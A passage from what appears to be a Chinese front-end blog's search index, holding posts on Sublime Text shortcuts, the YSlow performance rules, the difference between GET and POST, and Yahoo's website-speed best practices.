SETS：脚本和样式存放的目录SCM：软件管理配置PM：项目经理]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>前端流程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Sublime Text 2快捷键大全]]></title>
    <url>%2F2015%2F07%2F12%2Fsublime-text-2%E5%BF%AB%E6%8D%B7%E9%94%AE%E5%A4%A7%E5%85%A8%2F</url>
    <content type="text"><![CDATA[Ctrl+L选择整行(按住-继续选择下行)Ctrl+KK从光标处删除至行尾Ctrl+Shift+K删除整行Ctrl+Shift+D复制光标所在整行，插入在该行之前Ctrl+J合并行(已选择需要合并的多行时)Ctrl+KU改为大写Ctrl+KL改为小写Ctrl+D选词(按住-继续选择下个相同的字符串)Ctrl+M光标移动至括号内开始或结束的位置Ctrl+Shift+M选择括号内的内容(按住-继续选择父括号)Ctrl+/注释整行(如已选择内容，同“Ctrl+Shift+/”效果)Ctrl+Shift+/注释已选择内容Ctrl+Space自动完成(win与系统快捷键冲突，需修改)Ctrl+Z撤销Ctrl+Y恢复撤销Ctrl+Shift+V粘贴并自动缩进(其它兄弟写的，实测win系统自动缩进无效)Ctrl+M光标跳至对应的括号Alt+.闭合当前标签Ctrl+Shift+A选择光标位置父标签对儿Ctrl+Shift+[折叠代码展开代码Ctrl+KT折叠属性Ctrl+K0展开所有Ctrl+U软撤销Ctrl+T词互换Ctrl+Enter插入行后Ctrl+ShiftEnter插入行前Ctrl+KBackspace从光标处删除至行首Ctrl+Shift+UP与上行互换Ctrl+Shift+DOWN与下行互换Shift+Tab去除缩进Tab缩进F9行排序(按a-z)&nbsp;]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>Sublime</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Yslow-23条规则 前端性能优化]]></title>
    <url>%2F2015%2F07%2F12%2Fyslow-23%E6%9D%A1%E8%A7%84%E5%88%99-%E5%89%8D%E7%AB%AF%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%2F</url>
    <content type="text"><![CDATA[什么是YSlow？ YSlow是Yahoo发布的一款基于FireFox的插件。如何安装YSlow？安装YSlow必须首先先安装 Firebug，然后下载YSlow，再对其安装。YSlow有什么用？YSlow可以对网站的页面进行分析，并告诉你为了提高网站性能，如何基于某些规则而进行优化。YSlow可以分析任何网站，并为每一个规则产生一个整体报告，如果页面可以进行优化，则YSlow会列出具体的修改意见。Yslow-23条规则：1. 减少HTTP请求次数合并图片、CSS、JS，改进首次访问用户等待时间。2. 使用CDN就近缓存==&gt;智能路由==&gt;负载均衡==&gt;WSA全站动态加速3. 避免空的src和href当link标签的href属性为空、script标签的src属性为空的时候，浏览器渲染的时候会把当前页面的URL作为它们的属性值，从而把页面的内容加载进来作为它们的值。4.为文件头指定Expires使内容具有缓存性。避免了接下来的页面访问中不必要的HTTP请求。5. 使用gzip压缩内容压缩任何一个文本类型的响应，包括XML和JSON，都是值得的。6. 把CSS放到顶部7. 把JS放到底部防止js加载对之后资源造成阻塞。8. 避免使用CSS表达式9. 将CSS和JS放到外部文件中目的是缓存，但有时候为了减少请求，也会直接写到页面里，需根据PV和IP的比例权衡。10. 权衡DNS查找次数减少主机名可以节省响应时间。但同时，需要注意，减少主机会减少页面中并行下载的数量。 IE浏览器在同一时刻只能从同一域名下载两个文件。当在一个页面显示多张图片时，IE 用户的图片下载速度就会受到影响。所以新浪会搞N个二级域名来放图片。11. 精简CSS和JS12. 避免跳转同域：注意避免反斜杠 “/” 的跳转；跨域：使用Alias或者mod_rewirte建立CNAME（保存域名与域名之间关系的DNS记录）13. 删除重复的JS和CSS重复调用脚本，除了增加额外的HTTP请求外，多次运算也会浪费时间。在IE和Firefox中不管脚本是否可缓存，它们都存在重复运算JavaScript的问题。14. 配置ETags它用来判断浏览器缓存里的元素是否和原来服务器上的一致。比last-modified date更具有弹性，例如某个文件在1秒内修改了10次，Etag可以综合Inode(文件的索引节点(inode)数)，MTime(修改时间)和Size来精准的进行判断，避开UNIX记录MTime只能精确到秒的问题。服务器集群使用，可取后两个参数。使用ETags减少Web应用带宽和负载15. 可缓存的AJAX“异步”并不意味着“即时”：Ajax并不能保证用户不会在等待异步的JavaScript和XML响应上花费时间。16. 使用GET来完成AJAX请求当使用XMLHttpRequest时，浏览器中的POST方法是一个“两步走”的过程：首先发送文件头，然后才发送数据。因此使用GET获取数据时更加有意义。17. 减少DOM元素数量是否存在一个是更贴切的标签可以使用？人生不仅仅是DIV+CSS18. 避免404有些站点把404错误响应页面改为“你是不是要找*”，这虽然改进了用户体验但是同样也会浪费服务器资源（如数据库等）。最糟糕的情况是指向外部 JavaScript的链接出现问题并返回404代码。首先，这种加载会破坏并行加载；其次浏览器会把试图在返回的404响应内容中找到可能有用的部分当作JavaScript代码来执行。19. 减少Cookie的大小20. 使用无cookie的域比如图片 CSS 等，Yahoo! 的静态文件都在主域名以外，客户端请求静态文件的时候，减少了 Cookie 的反复传输对主域名的影响。21. 不要使用滤镜png24的在IE6半透明那种东西，别乱使，淡定的切成PNG8+jpg22. 不要在HTML中缩放图片23. 缩小favicon.ico并缓存整理下来正如以下几点(重点)：HTML部分语义化HTML：好处在于可以使代码简洁清晰，支持不同设备，利于搜索引擎，便于团队开发；减少DOM节点：加速页面渲染；给图片加上正确的宽高值：这可以减少页面重绘，同时防止图片缩放；防止src属性和link的href属性为空：当值为空时，浏览器很可能会把当前页面当成其属性值加载；正确的闭合标签：如避免使用&lt;div/&gt;，浏览器会多一个将它解析成&lt;div\&gt;&lt;/div\&gt;的过程；链接为目录或首页的地址后面加”/”，如http://www.qq.com/；用LINK而不用@import方式导入样式；样式放在页头，JS放在页尾；缩小favicon.ico并缓存；CSS部分避免使用 CSS:Expressions(CSS表达式)：如background-color: expression( (new Date()).getHours()%2 ? “#B8D4FF” : “#F08A00″ ) ;避免使用 CSS Filter（CSS滤镜）；使用CSS缩写，减少代码量；通过CSSSprites把同类图片合成一张，减少图片请求；减少查询层级：如.header .logo要好过.header .top .logo；减少查询范围：如.header&gt;li要好过.header li；避免TAG标签与CLASS或ID并存：如a.top、button#submit；删除重复的CSS；Javscript部分尽量少用全局变量；使用事件代理绑定事件，如将事件绑定在body上进行代理；避免频繁操作DOM节点；不使用EVAL；减少对象查找，如a.b.c.d这种查找方式非常耗性能，尽可能把它定义在变量里；类型转换：把数字转换成字符串使用”” +1，浮点数转换成整型使用Math.floor()或者Math.round()；对字符串进行循环操作，譬如替换、查找，应使用正则表达式；删除重复的JS；服务器部分尽量合并CSS、JS文件，或将其直接写在页面上，减少HTTP请求；压缩CSS、JS文件，缩短文件传输时间；避免404错误：特别要避免给404指定一个停摆页面，否则所有404错误都将会加载一次页面；一般要求减少DNS查询次数，如同一个页面的请求资源尽量少的使用不同的主机名，这可以减少网站并行下载的数量，但很多网站为了加速下载资源其实是特意用了多个主机名，这里要做一个权衡；使用CDN加速，使用户从离自己最近的服务器下载文件；减少Cookie的大小，使用无cookie的域，客户端请求静态文件的时候，减少 Cookie 的反复传输对主域名的影响；为文件头指定Expires，使内容具有缓存性；使用gzip压缩内容；]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>前端性能</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTTP之GET与POST区别]]></title>
    <url>%2F2015%2F07%2F12%2Fhttp%E4%B9%8Bget%E4%B8%8Epost%E5%8C%BA%E5%88%AB%2F</url>
    <content type="text"><![CDATA[HTTP定义了与服务器交互的不同方法，最基本的方法是 GET 和 POST.HTTP-GET和HTTP-POST是使用HTTP的标准协议动词，用于编码和传送变量名/变量值对参数，并且使用相关的请求语义。每个HTTP-GET和HTTP-POST都由一系列HTTP请求头组成，这些请求头定义了客户端从服务器请求了什么，而响应则是由一系列HTTP应答头和应答数据组成，如果请求成功则返回应答。HTTP-GET以使用MIME类型application/x-www-form-urlencoded的urlencoded文本的格式传递参数。Urlencoding是一种字符编码，保证被传送的参数由遵循规范的文本组成，例如一个空格的编码是”%20”。附加参数还能被认为是一个查询字符串。与HTTP-GET类似，HTTP-POST参数也是被URL编码的。然而，变量名/变量值不作为URL的一部分被传送，而是放在实际的HTTP请求消息内部被传送。GET和POST之间的主要区别如下：（1）get是从服务器上获取数据，post是向服务器传送数据。（2）在客户端，Get方式在通过URL提交数据，数据在URL中可以看到；POST方式，数据放置在HTML HEADER内提交。（3）对于get方式，服务器端用Request.QueryString获取变量的值，对于post方式，服务器端用Request.Form获取提交的数据。（4） GET方式提交的数据最多只能有1024字节，而POST则没有此限制。（5） 安全性问题。正如在（2）中提到，使用 Get 的时候，参数会显示在地址栏上，而 Post 不会。所以，如果这些数据是中文数据而且是非敏感数据，那么使用 get；如果用户输入的数据不是中文字符而且包含敏感数据，那么还是使用 post为好。注：所谓安全的意味着该操作用于获取信息而非修改信息。幂等的意味着对同一 URL 的多个请求应该返回同样的结果。完整的定义并不像看起来那样严格。换句话说，GET 请求一般不应产生副作用。从根本上讲，其目标是当用户打开一个链接时，她可以确信从自身的角度来看没有改变资源。比如，新闻站点的头版不断更新。虽然第二次请求会返回不同的一批新闻，该操作仍然被认为是安全的和幂等的，因为它总是返回当前的新闻。反之亦然。POST 请求就不那么轻松了。POST 表示可能改变服务器上的资源的请求。仍然以新闻站点为例，读者对文章的注解应该通过POST请求实现，因为在注解提交之后站点已经不同了（比方说文章下面出现一条注解）。一个简单的例子来说明它们的区别：1234567891011&lt;!-分别通过get和post方式提交表单--&gt;&lt;FORM ACTION="getpost.asp" METHOD="get"&gt;&lt;INPUT TYPE="text" NAME="Text" VALUE="http://wxf0701.cnblogs.com//&gt;&lt;INPUT TYPE="submit" VALUE="Get方式"&gt;&lt;/INPUT&gt;&lt;/FORM&gt;&lt;FORM ACTION="getpost.asp" METHOD="post"&gt;&lt;INPUT TYPE="text" NAME="Text" VALUE="http://wxf0701.cnblogs.com/&gt;&lt;INPUT TYPE="submit" VALUE="Post方式"&gt;&lt;/INPUT&gt;&lt;/FORM&gt;&lt;% If Request.QueryString(“Text”) &lt;&gt; “” Then %&gt;通过get方式传递的字符串是：&lt;%= Request.QueryString(“Text”) %&gt;&lt;% End If %&gt;&lt;% If Request.Form(“Text”) &lt;&gt; “” Then %&gt;通过Post方式传递的字符串是：&lt;%= Request.Form(“Text”) %&gt;&lt;% End If %&gt;]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>get</tag>
        <tag>pot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[雅虎35条优化黄金守则]]></title>
    <url>%2F2015%2F07%2F12%2F%E9%9B%85%E8%99%8E35%E6%9D%A1%E4%BC%98%E5%8C%96%E9%BB%84%E9%87%91%E5%AE%88%E5%88%99%2F</url>
    <content type="text"><![CDATA[Yahoo!的 Exceptional Performance团队为改善 Web性能带来最佳实践。他们为此进行了一系列的实验、开发了各种工具、写了大量的文章和博客并在各种会议上参与探讨。最佳实践的核心就是旨在提高网站性能。原版猛戳：Best Practices for Speeding Up Your Web Site，Excetional Performance 团队总结出了一系列可以提高网站速度的方法。可以分为 7大类 35条。包括内容 、服务器 、 CSS 、 JavaScript 、Cookie 、图片 、移动应用 ，七部分。一、内容部分尽量减少 HTTP请求减少 DNS查找避免跳转缓存 Ajxa推迟加载提前加载减少 DOM元素数量用域名划分页面内容使 frame数量最少避免 404错误1、尽量减少 HTTP请求次数终端用户响应的时间中，有 80%用于下载各项内容。这部分时间包括下载页面中的图像、样式表、脚本、 Flash等。通过减少页面中的元素可以减少 HTTP请求的次数。这是提高网页速度的关键步骤。减少页面组件的方法其实就是简化页面设计。那么有没有一种方法既能保持页面内容的丰富性又能达到加快响应时间的目的呢？这里有几条减少HTTP请求次数同时又可能保持页面内容丰富的技术。合并文件是通过把所有的脚本放到一个文件中来减少 HTTP请求的方法，如可以简单地把所有的 CSS文件都放入一个样式表中。当脚本或者样式表在不同页面中使用时需要做不同的修 改，这可能会相对麻烦点，但即便如此也要把这个方法作为改善页面性能的重要一步。CSS Sprites是减少图像请求的有效方法。把所有的背景图像都放到一个图片文件中，然后通过 CSS的 background-image和 background-position属性来显示图片的不同部分；图片地图是把多张图片整合到一张图片中。虽然文件的总体大小不会改变，但是可 以减少 HTTP请求次数。图片地图只有在图片的所有组成部分在页面中是紧挨在一起的时候才能 使用，如导航栏。确定图片的坐标和可能会比较繁琐且容易出错，同时使用图片地图导航也不具有可读性，因此不推荐这种方法；内联图像是使用 data:URL scheme的方法把图像数据加载页面中。这可能会增加页面的大 小。把内联图像放到样式表（可缓存）中可以减少 HTTP请求同时又避免增加页面文件的大小。但是内联图像现在还没有得到主流浏览器的 支持。减少页面的 HTTP请求次数是你首先要做的一步。这是改进首次访问用户等待时间的最重要的方法。 如同 Tenni Theurer的他的博客 Browser Cahe Usage - Exposed!中所说， HTTP请求在无缓存情况下占去了 40%到 60%的响应时间。让那些初次访问你网站的人获得更加快速的体验吧！2、减少 DNS查找次数域名系统（ DNS）提供了域名和 IP的对应关系，就像电话本中人名和他们的电话号码的关系一样。当你在浏览器地址栏中 输入 www.yahoo.com 时， DNS解析服务器就会返回这个域名对应的 IP地址。 DNS解析的过程同样也是需要时间的。一般情况下返回给定域名对应的 IP地址会花费 20到 120毫秒的时间。而且在这个过程中浏览器什么都不会做直到 DNS查找完毕。缓存 DNS查找可以改善页面性能。这种缓存需要一个特定的缓存服务器，这种服务器一般属于用户的 ISP提供商或者本地局域网控制，但是它同样会在用户使用的计算机上产生缓存。 DNS信息会保留在操作系统的 DNS缓存中（微软 Windows系统中 DNS Client Service）。大多数浏览器有独立于操作系统以外的自己的缓存。由于浏览器有自己的缓存记录，因此在一次请求中它不会受到操作系统的影响。Internet Explorer 默认情况下对 DNS查找记录的缓存时间为 30分钟，它在注册表中的键值为 DnsCacheTimeout。 Firefox对 DNS的查找记录缓存时间为 1分钟，它在配置文件中的选项为 network.dnsCacheExpiration（ Fasterfox把这个选项改为了 1小时）。当客户端中的 DNS缓存都为空时（浏览器和操作系统都为空）， DNS查找的次数和页面中主机名的数量相同。这其中包括页面中 URL、图片、脚本文件、样式表、Flash对象等包含的主机名。减少主机名的数量可以减少DNS查找次数。减少主机名的数量还可以减少页面中并行下载的数量。减少 DNS查找次数可以节省响应时间，但是减少并行下载却会增加响应时间。我的指导原则是 把这些页面中的内容分割成至少两部分但不超过四部分。这种结果就是在减少 DNS查找次数和保持较高程度并行下载两者之间的权衡了。3、避免跳转跳转是使用 301和 302代码实现的。下面是一个响应代码为 301的 HTTP头：HTTP/1.1 301 Moved PermanentlyLocation: http://example.com/newuriContent-Type: text/html浏览器会把用户指向到 Location中指定的 URL。头文件中的所有信息在一次跳转中都是必需的，内容部分可以为空。不管他们的名 称， 301和 302响应都不会被缓存除非增加一个额外的头选项，如 Expires或者 Cache-Control来指定它缓存。元素的刷新标签和JavaScript也可以实现 URL的跳转，但是如果你必须要跳转的时候，最好的方法就是使用标准的 3XXHTTP状态代码，这主要是为了确保“后退”按钮可以正确地使用。但是要记住跳转会降低用户体验。在用户和 HTML文档中间增加一个跳转，会拖延页面中所有元素的显示，因为在 HTML文件被加载前任何文件（图像、 Flash等）都不会被下载。有一种经常被网页开发者忽略却往往十分浪费响应时间的跳转现象。 这种现象发生在当 URL本该有斜杠（ /）却被忽略掉时。例如，当我们要访问http://astrology.yahoo.com/astrology 时，实际上返回的是一个包含 301代码的跳转，它指向的是http://astrology.yahoo.com/astrology/ （注意末尾的斜杠）。在 Apache服务器中可以使用 Alias 或者 mod_rewrite或者 the DirectorySlash来避免。连接新网站和旧网站是跳转功能经常被用到的另一种情况。这种情况 下往往要连接网站的不同内容然后根据用户的不同类型（如浏览器类型、用户账号所属类型）来进行跳转。使用跳转来实现两个网站的切换十分简单，需要的代码量 也不多。尽管使用这种方法对于开发者来说可以降低复杂程度，但是它同样降低用户体验。一个可替代方法就是如果两者在同一台服务器上时使用 Alias和 mod_rewrite和实现。如果是因为域名的不同而采用跳转，那么可以通过使用 Alias或者 mod_rewirte建立 CNAME（保存一个域名和另外一个域名之间关系的DNS记录）来替代。4、可缓存的 AJAXAjax 经常被提及的一个好处就是由于其从后台服务器传输信息 的异步性而为用户带来的反馈的即时性。但是，使用 Ajax并不能保证用户不会在等待异步的 JavaScript和 XML响应上花费时间。在很多应用中，用户是否需要等待响应取决于 Ajax如何来使用。例如，在一个基于 Web的 Email客户端中，用户必须等待 Ajax返回符合他们条件的邮件查询结果。记住一点，“异步”并不异味着“即时”，这 很重要。为了提高性能，优化 Ajax响应是很重要的。提高 Ajxa性能的措施中最重要的方法就是使响应具有可缓存性，具体的讨论可以查看 Add an Expires or a Cache-Control Header。 其它的几条规则也同样适用于Ajax：Gizp 压缩文件减少 DNS查找次数精简 JavaScript避免跳转配置 ETags让我们来看一个例子：一个 Web2.0的 Email客户端会使用 Ajax来自动完成对用户地址薄的下载。如果用户在上次使用过 Email web应用程序后没有对地址薄作任何的修改，而且 Ajax响应通过 Expire或者 Cacke-Control头来实现缓存，那么就可以直接从上一次的缓存中读取地址薄 了。必须告知浏览器是使用缓存中的地址薄还是发送一个新的请求。这可以通过为读取地址薄的 Ajax URL增加一个含有上次编辑时间的时间戳来实现，例如， &amp;t=11900241612等。如果地址薄在上次下载后没有被编辑过，时间 戳就不变，则从浏览器的缓存中加载从而减少了一次 HTTP请求过程。如果用户修改过地址薄，时间戳就会用来确定新的 URL和缓存响应并不匹配，浏览器就会重要请求更新地址薄。即使你的 Ajxa响应是动态生成的，哪怕它只适用于一个用户，那么它也应该被缓存起来。这样做 可以使你的 Web2.0应用程序更加快捷。5、推迟加载内容你可以仔细看一下你的网页，问问自己“哪些内容是页面呈现时 所必需首先加载的？哪些内容和结构可以稍后再加载？把整个过程按照 onload事件分隔成两部分， JavaScript是一个理想的选择。例如，如果你有用于实现拖放和动画的 JavaScript，那么它就以等待稍后加载，因为页面上的拖放元素是在初始化呈现 之后才发生的。其它的例如隐藏部分的内容（用户操作之后才显现的内容）和处于折叠部分的图像也可以推迟加载工具可以节省你的工作量： YUI Image Loader可以帮你推迟加载折叠部分的图片， YUI Get utility是包含 JS和 CSS的便捷方法。比如你可以打开 Firebug的 Net选项卡看一下 Yahoo的首页。当性能目标和其它网站开发实践一致时就会相得益彰。这种情况 下，通过程序提高网站性能的方法告诉我们，在支持 JavaScript的情况下，可以先去除用户体验，不过这要保证你的网站在没有 JavaScript也可以正常运行。在确定页面运行正常后，再加载脚本来实现如拖放和动画等更加花哨的效果。6、预加载预加载和后加载看起来似乎恰恰相反，但实际上预加载是为了实 现另外一种目标。预加载是在浏览器空闲时请求将来可能会用到的页面内容（如图像、样式表和脚本）。使用这种方法，当用户要访问下一个页面时，页面中的内容 大部分已经加载到缓存中了，因此可以大大改善访问速度。下面提供了几种预加载方法：无条件加载：触发 onload事件时，直接加载额外的页面内容。以 Google.com为例，你可以看一下它的 spirit image图像是怎样在 onload中加载的。这个 spirit image图像在 google.com主页中是不需要的，但是却可以在搜索结果页面中用到它。有条件加载：根据用户的操作来有根据地判断用户下面可能去往的页面并相应的预 加载页面内容。在 search.yahoo.com中你可以看到如何在你输入内容时加载额外的页面内容。有预期的加载：载入重新设计过的页面时使用预加载。这种情况经常出现在页面经过重新设计后用户抱怨“新的页面看起来很酷，但是却比以前慢”。问题可能出在 用户对于你的旧站点建立了完整的缓存，而对于新站点却没有任何缓存内容。因此你可以在访问新站之前就加载一部内容来避免这种结果的出现。在你的旧站中利用 浏览器的空余时间加载新站中用到的图像的和脚本来提高访问速度。7、减少 DOM元素数量一个复杂的页面意味着需要下载更多数据，同时也意味着 JavaScript遍历 DOM的效率越慢。比如当你增加一个事件句柄时在 500和 5000个 DOM元素中循环效果肯定是不一样的。大量的 DOM元素的存在意味着页面中有可以不用移除内容只需要替换元素标签就可以精简的部分。你在页面布局中使用表格了吗？你有没有仅仅为了布局而引入更多的元素呢？也许会存在一个适合或者在语意是更贴切的标签可以供你使用。YUI CSS utilities 可以给你的布局带来巨大帮助： grids.css可以帮你实现整体布局， font.css和 reset.css可以帮助你移除浏览器默认格式。它提供了一个重新审视你页面中标签 的机会，比如只有在语意上有意义时才使用，而不是因为它具有换行效果才使用它。DOM 元素数量很容易计算出来，只需要在 Firebug的控制台内输入：document.getElementsByTagName(‘*’).length那么多少个 DOM元素算是多呢？这可以对照有很好标记使用的类似页面。比如 Yahoo!主页是一个内容非常多的页面，但是它只使用了 700个元素（ HTML标签）。8、根据域名划分页面内容把页面内容划分成若干部分可以使你最大限度地实现平行下载。由于 DNS查找带来的影响你首先要确保你使用的域名数量在 2个到 4个之间。例如，你可以把用到的 HTML内容和动态内容放在 http://www.example.org/ 上，而把页面各种组件（图片、脚本、 CSS)分别存放在 statics1.example.org和 statics.example.org上。你可在 Tenni Theurer和 Patty Chi合写的文章 Maximizing Parallel Downloads in the Carpool Lane找到更多相关信息。9、使 iframe的数量最小ifrmae 元素可以在父文档中插入一个新的 HTML文档。了解 iframe的工作理然后才能更加有效地使用它，这一点很重要。优点：解决加载缓慢的第三方内容如图标和广告等的加载问题Security sandbox并行加载脚本的缺点：即时内容为空，加载也需要时间会阻止页面加载没有语意10、不要出现 404错误HTTP 请求时间消耗是很大的，因此使用 HTTP请求来获得一个没有用处的响应（例如 404没有找到页面）是完全没有必要的，它只会降低用户体验而不会有一点好处。有些站点把 404错误响应页面改为“你是不是要找 *”，这虽然改进了用户体验但是同样也会浪费服务器资源（如数据库等）。最糟糕的 情况是指向外部 JavaScript的链接出现问题并返回 404代码。首先，这种加载会破坏并行加载；其次浏览器会把试图在返回的404响应内容中找到可能有用的部分当作 JavaScript代码来执行。二、服务器部分使用内容分发网络为文件头指定Expires或Cache-ControlGzip压缩文件内容配置ETag尽早刷新输出缓冲使用GET来完成AJAX请求避免空的图像来源11、使用内容分发网络用户与你网站服务器的接近程度会影响响应时间的长短。把你的网站内容分散到多个、处于不同地域位置的服务器上可以加快下载速度。但是首先我们应该做些什么呢？按地域布置网站内容的第一步并不是要尝试重新架构你的网站让他们在分发服务器上正常运行。根据应用的需求来改变网站结构，这可能会包括一些比较复杂的任 务，如在服务器间同步Session状态和合并数据库更新等。要想缩短用户和内容服务器的距离，这些架构步骤可能是不可避免的。要记住，在终端用户的响应时间中有80%到90%的响应时间用于下载图像、样式表、脚本、Flash等页面内容。这就是网站性能黄金守则。和重新设计你的 应用程序架构这样比较困难的任务相比，首先来分布静态内容会更好一点。这不仅会缩短响应时间，而且对于内容分发网络来说它更容易实现。内容分发网络（Content Delivery Network，CDN）是由一系列分散到各个不同地理位置上的Web服务器组成的，它提高了网站内容的传输速度。用于向用户传输内容的服务器主要是根据 和用户在网络上的靠近程度来指定的。例如，拥有最少网络跳数（network hops）和响应速度最快的服务器会被选定。一些大型的网络公司拥有自己的CDN，但是使用像Akamai Technologies，Mirror Image Internet，或者Limelight Networks这样的CDN服务成本却非常高。对于刚刚起步的企业和个人网站来说，可能没有使用CDN的成本预算，但是随着目标用户群的不断扩大和更加 全球化，CDN就是实现快速响应所必需的了。以Yahoo来说，他们转移到CDN上的网站程序静态内容节省了终端用户20%以上的响应时间。使用CDN是一个只需要相对简单地修改代码实现显著改善网站访问速度的方法。12、为文件头指定Expires或Cache-Control这条守则包括两方面的内容：对于静态内容：设置文件头过期时间Expires的值为“Never expire”（永不过期）对于动态内容：使用恰当的Cache-Control文件头来帮助浏览器进行有条件的请求网页内容设计现在越来越丰富，这就意味着页面中要包含更多的脚本、样式表、图片和Flash。第一次访问你页面的用户就意味着进行多次的HTTP请求，但 是通过使用Expires文件头就可以使这样内容具有缓存性。它避免了接下来的页面访问中不必要的HTTP请求。Expires文件头经常用于图像文件， 但是应该在所有的内容都使用他，包括脚本、样式表和Flash等。浏览器（和代理）使用缓存来减少HTTP请求的大小和次数以加快页面访问速度。Web服务器在HTTP响应中使用Expires文件头来告诉客户端内容需 要缓存多长时间。下面这个例子是一个较长时间的Expires文件头，它告诉浏览器这个响应直到2010年4月15日才过期。Expires: Thu, 15 Apr 2010 20:00:00 GMT如果你使用的是Apache服务器，可以使用ExpiresDefault来设定相对当前日期的过期时间。下面这个例子是使用ExpiresDefault来设定请求时间后10年过期的文件头：ExpiresDefault “access plus 10 years”要切记，如果使用了Expires文件头，当页面内容改变时就必须改变内容的文件名。依Yahoo!来说我们经常使用这样的步骤：在内容的文件名中加上版 本号，如yahoo_2.0.6.js。使用Expires文件头只有会在用户已经访问过你的网站后才会起作用。当用户首次访问你的网站时这对减少HTTP请求次数来说是无效的，因为浏览器的缓 存是空的。因此这种方法对于你网站性能的改进情况要依据他们“预缓存”存在时对你页面的点击频率（“预缓存”中已经包含了页面中的所有内容）。 Yahoo!建立了一套测量方法，我们发现所有的页面浏览量中有75~85%都有“预缓存”。通过使用Expires文件头，增加了缓存在浏览器中内容的 数量，并且可以在用户接下来的请求中再次使用这些内容，这甚至都不需要通过用户发送一个字节的请求。13、Gzip压缩文件内容网络传输中的HTTP请求和应答时间可以通过前端机制得到显著改善。的确，终端用户的带宽、互联网提供者、与对等交换点的靠近程度等都不是网站开发者所能 决定的。但是还有其他因素影响着响应时间。通过减小HTTP响应的大小可以节省HTTP响应时间。从HTTP/1.1开始，web客户端都默认支持HTTP请求中有Accept-Encoding文件头的压缩格式：Accept-Encoding: gzip, deflate如果web服务器在请求的文件头中检测到上面的代码，就会以客户端列出的方式压缩响应内容。Web服务器把压缩方式通过响应文件头中的Content- Encoding来返回给浏览器。Content-Encoding: gzipGzip是目前最流行也是最有效的压缩方式。这是由GNU项目开发并通过RFC 1952来标准化的。另外仅有的一个压缩格式是deflate，但是它的使用范围有限效果也稍稍逊色。Gzip大概可以减少70%的响应规模。目前大约有90%通过浏览器传输的互联网交换支持gzip格式。如果你使用的是Apache，gzip模块配置和 你的版本有关：Apache 1.3使用mod_zip，而Apache 2.x使用moflate。浏览器和代理都会存在这样的问题：浏览器期望收到的和实际接收到的内容会存在不匹配的现象。幸好，这种特殊情况随着旧式浏览器使用量的减少在减少。 Apache模块会通过自动添加适当的Vary响应文件头来避免这种状况的出现。服务器根据文件类型来选择需要进行gzip压缩的文件，但是这过于限制了可压缩的文件。大多数web服务器会压缩HTML文档。对脚本和样式表进行压缩同 样也是值得做的事情，但是很多web服务器都没有这个功能。实际上，压缩任何一个文本类型的响应，包括XML和JSON，都值得的。图像和PDF文件由于 已经压缩过了所以不能再进行gzip压缩。如果试图gizp压缩这些文件的话不但会浪费CPU资源还会增加文件的大小。Gzip压缩所有可能的文件类型是减少文件体积增加用户体验的简单方法。14、配置ETagEntity tags（ETags）（实体标签）是web服务器和浏览器用于判断浏览器缓存中的内容和服务器中的原始内容是否匹配的一种机制（“实体”就是所说的“内 容”，包括图片、脚本、样式表等）。增加ETag为实体的验证提供了一个比使用“last-modified date（上次编辑时间）”更加灵活的机制。Etag是一个识别内容版本号的唯一字符串。唯一的格式限制就是它必须包含在双引号内。原始服务器通过含有 ETag文件头的响应指定页面内容的ETag。HTTP/1.1 200 OKLast-Modified: Tue, 12 Dec 2006 03:03:59 GMTETag: “10c24bc-4ab-457e1c1f”Content-Length: 12195稍后，如果浏览器要验证一个文件，它会使用If-None-Match文件头来把ETag传回给原始服务器。在这个例子中，如果ETag匹配，就会返回一 个304状态码，这就节省了12195字节的响应。 GET /i/yahoo.gif HTTP/1.1Host: us.yimg.comIf-Modified-Since: Tue, 12 Dec 2006 03:03:59 GMTIf-None-Match: “10c24bc-4ab-457e1c1f”HTTP/1.1 304 Not ModifiedETag的问题在于，它是根据可以辨别网站所在的服务器的具有唯一性的属性来生成的。当浏览器从一台服务器上获得页面内容后到另外一台服务器上进行验证时 ETag就会不匹配，这种情况对于使用服务器组和处理请求的网站来说是非常常见的。默认情况下，Apache和IIS都会把数据嵌入ETag中，这会显著 减少多服务器间的文件验证冲突。Apache 1.3和2.x中的ETag格式为inode-size-timestamp。即使某个文件在不同的服务器上会处于相同的目录下，文件大小、权限、时间戳 等都完全相同，但是在不同服务器上他们的内码也是不同的。IIS 5.0和IIS 6.0处理ETag的机制相似。IIS中的ETag格式为Filetimestamp:ChangeNumber。用ChangeNumber来跟踪 IIS配置的改变。网站所用的不同IIS服务器间ChangeNumber也不相同。不同的服务器上的Apache和IIS即使对于完全相同的内容产生的 ETag在也不相同，用户并不会接收到一个小而快的304响应；相反他们会接收一个正常的200响应并下载全部内容。如果你的网站只放在一台服务器上，就 不会存在这个问题。但是如果你的网站是架设在多个服务器上，并且使用Apache和 IIS产生默认的ETag配置，你的用户获得页面就会相对慢一点，服务器会传输更多的内容，占用更多的带宽，代理也不会有效地缓存你的网站内容。即使你的 内容拥有Expires文件头，无论用户什么时候点击“刷新”或者“重载”按钮都会发送相应的GET请求。如果你没有使用ETag提供的灵活的验证模式，那么干脆把所有的ETag都去掉会更好。Last-Modified文件头验证是基于内容的时间戳的。去掉 ETag文件头会减少响应和下次请求中文件的大小。微软的这篇支持文稿讲述了如何去掉ETag。在Apache中，只需要在配置文件中简单添加下面一行代 码就可以了：FileETag none15、尽早刷新输出缓冲当用户请求一个页面时，无论如何都会花费200到500毫秒用于后台组织HTML文件。在这期间，浏览器会一直空闲等待数据返回。在PHP中，你可以使用 flush()方法，它允许你把已经编译的好的部分HTML响应文件先发送给浏览器，这时浏览器就会可以下载文件中的内容（脚本等）而后台同时处理剩余的 HTML页面。这样做的效果会在后台烦恼或者前台较空闲时更加明显。输出缓冲应用最好的一个地方就是紧跟在之后，因为HTML的头部分容易生成而且头部往往包含CSS和JavaScript文件，这样浏览器就可以在后台编译剩余HTML的同时并行下 载它们。 例子：…&lt;?php flush(); 